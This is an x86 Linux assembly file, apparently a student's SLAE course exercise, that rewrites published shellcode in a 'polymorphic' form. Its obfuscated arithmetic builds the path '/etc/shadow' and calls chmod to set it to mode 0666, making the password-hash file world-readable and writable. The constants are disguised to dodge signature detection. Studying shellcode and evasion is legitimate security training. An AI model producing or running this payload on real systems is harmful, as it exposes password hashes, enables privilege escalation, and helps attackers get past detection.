; Filename: SLAEpolyCHMOD.nasm
; Author:  Billy (@_hAxel)
; Website:  https://www.haxel.io
;
; Student ID:  PA-7462
; Purpose: SLAE Assignmnet 6.3 - Polymorphed version of CHMOD shellcode, Original found here: http://shell-storm.org/shellcode/files/shellcode-210.php

global _start			

section .text
_start:

      	xor edx, edx
       	mov eax, edx
	mov al, 0x01
       	push edx
       	push byte 0x77
       	push word 0x6f64
	mov edi, 0x6067722e
	add edi, 0x01010101
	push edi
       	mov edi, 0x5364551f
	add edi, 0x10101010
	push edi
	mov ebx, esp
       	push word 0666Q
       	pop ecx
       	add al, 14
	int 0x80

       	push byte 1
       	pop eax
	int 0x80
